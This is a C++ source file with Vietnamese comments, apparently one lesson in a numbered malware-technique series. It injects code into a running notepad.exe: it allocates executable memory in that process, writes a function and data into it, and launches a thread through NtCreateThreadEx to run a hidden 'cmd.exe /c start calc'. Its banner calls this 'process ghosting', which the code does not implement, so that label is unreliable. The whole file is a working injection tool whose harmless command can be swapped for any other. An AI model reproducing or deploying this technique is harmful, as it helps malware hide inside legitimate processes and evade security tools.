#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>
#include <vector>

// 1. Định nghĩa chuẩn xác nguyên mẫu hàm Native API ngầm gánh luồng xử lý dạng NTSTATUS
typedef NTSTATUS(NTAPI* pNtCreateThreadEx)(
    OUT PHANDLE ThreadHandle,
    IN ACCESS_MASK DesiredAccess,
    IN PVOID ObjectAttributes OPTIONAL,
    IN HANDLE ProcessHandle,
    IN PVOID StartRoutine,
    IN PVOID Argument OPTIONAL,
    IN ULONG CreateFlags,
    IN ULONG_PTR ZeroBits,
    IN SIZE_T StackSize,
    IN SIZE_T MaximumStackSize,
    IN PVOID AttributeList OPTIONAL
    );

typedef UINT(WINAPI* fnWinExec)(LPCSTR lpCmdLine, UINT uCmdShow);

// Cấu trúc dữ liệu chứa tham số tuyệt đối loại bỏ hoàn toàn lỗi địa chỉ tương đối RIP
typedef struct _THREAD_DATA {
    fnWinExec pWinExec;       // Địa chỉ tuyệt đối của hàm WinExec trên RAM tiến trình đích
    char szCommand[32];       // Chuỗi lệnh thực thi chức năng mở máy tính
} THREAD_DATA, * PTHREAD_DATA;

// Hàm chức năng độc lập vị trí gánh luồng chạy inside lòng tiến trình đối phương
DWORD WINAPI NativeInjectionPayload(LPVOID lpParam) {
    PTHREAD_DATA pData = (PTHREAD_DATA)lpParam;
    if (pData && pData->pWinExec) {
        // Khai hỏa bằng địa chỉ tuyệt đối, bẻ gãy hoàn toàn rào cản địa chỉ tương đối RIP
        pData->pWinExec(pData->szCommand, SW_HIDE);
    }
    return 0;
}

// Bộ quét RAM động tự động nhận diện PID linh hoạt, KHÔNG PHÂN BIỆT chữ hoa chữ thường
DWORD GetProcessIDByName(const std::wstring& processName) {
    DWORD processID = 0;
    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, processName.c_str()) == 0) {
                processID = pe32.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnapshot, &pe32));
    }
    CloseHandle(hSnapshot);
    return processID;
}

int main() {
    std::cout << "====================================================" << std::endl;
    std::cout << "[*] PE 14: PROCESS GHOSTING" << std::endl;
    std::cout << "====================================================" << std::endl;

    // CHỦ ĐỘNG: Cấu hình linh hoạt tên tiến trình vỏ bọc hợp pháp, dễ dàng hoán đổi
    std::wstring targetProcess = L"notepad.exe";
    DWORD pid = GetProcessIDByName(targetProcess);

    if (pid == 0) {
        std::wcout << L"[-] Tien trinh " << targetProcess << L" khong chay! Vui long bat tien trinh truoc." << std::endl;
        std::cin.get();
        return EXIT_FAILURE;
    }

    std::wcout << L"[+] Da tim thay " << targetProcess << L" voi PID: " << pid << std::endl;

    // Mở Handle kết nối xuyên biên giới tiến trình với quyền hạn đầy đủ
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        std::cerr << "[-] OpenProcess failed! Quyen Han CLI hien tai bi han che." << std::endl;
        return EXIT_FAILURE;
    }

    // ─── BƯỚC 1: CẤP PHÁT PHÂN VÙNG NHỚ ĐỘNG MANG QUYỀN THỰC THI (ZERO STATIC BUFFERS) ───
    SIZE_T functionSize = 500;
    // Cấp phát động vừa khít khối mã máy mang quyền RWX và khối tham số mang quyền RW
    LPVOID remoteCodeBuffer = VirtualAllocEx(hProcess, NULL, functionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    PTHREAD_DATA pRemoteData = (PTHREAD_DATA)VirtualAllocEx(hProcess, NULL, sizeof(THREAD_DATA), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (!remoteCodeBuffer || !pRemoteData) {
        std::cerr << "[-] VirtualAllocEx chéo tien trinh that bai!" << std::endl;
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }
    std::cout << "[+] Phan vung Code Payload thiet lap an toan tai: 0x" << std::hex << remoteCodeBuffer << std::endl;

    // ─── BƯỚC 2: KHỞI TẠO DỮ LIỆU CON TRỎ TUYỆT ĐỐI CỤC BỘ VÀ SAO CHÉP ───
    THREAD_DATA localData;
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (hKernel32) {
        localData.pWinExec = (fnWinExec)GetProcAddress(hKernel32, "WinExec");
    }
    strcpy_s(localData.szCommand, "cmd.exe /c start calc");

    // Đẩy trực tiếp mã máy hàm độc lập vị trí và cấu trúc dữ liệu sang RAM đối phương
    WriteProcessMemory(hProcess, remoteCodeBuffer, (LPCVOID)NativeInjectionPayload, functionSize, NULL);
    WriteProcessMemory(hProcess, pRemoteData, &localData, sizeof(THREAD_DATA), NULL);
    std::cout << "[+] Nap va sao chep logic ham chuc nang hoan tat." << std::endl;

    // ─── BƯỚC 3: PHÂN GIẢI VÀ KHỞI TẠO LUỒNG NATIVE ĐÂM THẲNG VÀO PAYLOAD ───
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");

    if (!NtCreateThreadEx) {
        std::cerr << "[-] Khong the dinh vi con tro ham NtCreateThreadEx tu ntdll!" << std::endl;
        VirtualFreeEx(hProcess, remoteCodeBuffer, 0, MEM_RELEASE);
        VirtualFreeEx(hProcess, pRemoteData, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }

    std::cout << "[*] Dang dung NtCreateThreadEx de sinh luong va khai hoa truc tiep..." << std::endl;
    HANDLE hThread = NULL;

    // Khai hỏa luồng Native cấp thấp đâm thẳng vào phân vùng thực thi ảo chéo tiến trình
    NTSTATUS status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, remoteCodeBuffer, pRemoteData, 0, 0, 0, 0, NULL);

    if (status == 0 && hThread != NULL) { // 0 đại diện cho STATUS_SUCCESS hợp pháp kịch khung
        // Sử dụng cờ kết thúc đồng bộ bảo đảm quy trình chạy mượt mà
        WaitForSingleObject(hThread, INFINITE);
        std::cout << "\n[+] Native Process Injection Executed Successfully!" << std::endl;
        CloseHandle(hThread);
    }
    else {
        std::cerr << "[-] NtCreateThreadExProc failed! NTSTATUS Code: 0x" << std::hex << status << std::endl;
    }

    // Thu hồi tài nguyên bộ nhớ ảo từ xa và đóng handle bảo an kịch trần
    VirtualFreeEx(hProcess, remoteCodeBuffer, 0, MEM_RELEASE);
    VirtualFreeEx(hProcess, pRemoteData, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    std::cout << "[*] Hoan thanh chu ky song. Nhan phim Enter de dong cua so..." << std::endl;
    std::cin.get();
    return EXIT_SUCCESS;
}